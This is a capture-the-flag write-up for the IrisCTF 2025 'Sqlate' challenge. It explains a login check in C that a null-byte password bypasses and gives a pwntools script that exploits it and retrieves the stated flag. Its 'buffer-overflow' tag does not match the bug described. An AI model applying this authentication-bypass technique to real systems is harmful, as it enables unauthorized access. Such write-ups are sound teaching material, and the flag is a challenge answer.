---
title: "Sqlate"
date: "2025-01-12"
ctf: "IrisCTF 2025"
category: "web"
difficulty: "Easy"
points: 50
tags: ["web", "binary", "buffer-overflow"]
author: "Tham Le"
solved: true
---

# Sqlate Write-up

Challenge: Sqlate (50 points)
Category: Web/Binary

## Vulnerability

The vulnerability lies in `action_login()`:

```c
void action_login() {
    read_to_buffer("Password?");
    unsigned long length = strlen(line_buffer);
    for (unsigned long i = 0; i < length && i < 512; i++) {
        if (line_buffer[i] != admin_password[i]) {
            printf("Wrong password!\n");
            return;
        }
    }
}
```

The login function compares characters one by one without verifying the full password length. When we input a null byte (`\x00`), `strlen()` returns 0, causing the comparison loop to be skipped entirely.

## Exploit

```python
from pwn import *

conn = remote('sqlate.chal.irisc.tf', 10000)

conn.recvuntil(b'> ')
conn.sendline(b'5')

conn.recvuntil(b'Password?')
conn.sendline(b'\x00')

conn.recvuntil(b'> ')
conn.sendline(b'7')

flag = conn.recvline()
print(flag.decode())

conn.close()
```

1. Send option 5 for login
2. Send null byte as password to bypass check
3. Use option 7 (hidden) to cat flag
4. Get flag

Flag: `irisctf{real_programmers_use_vim}`
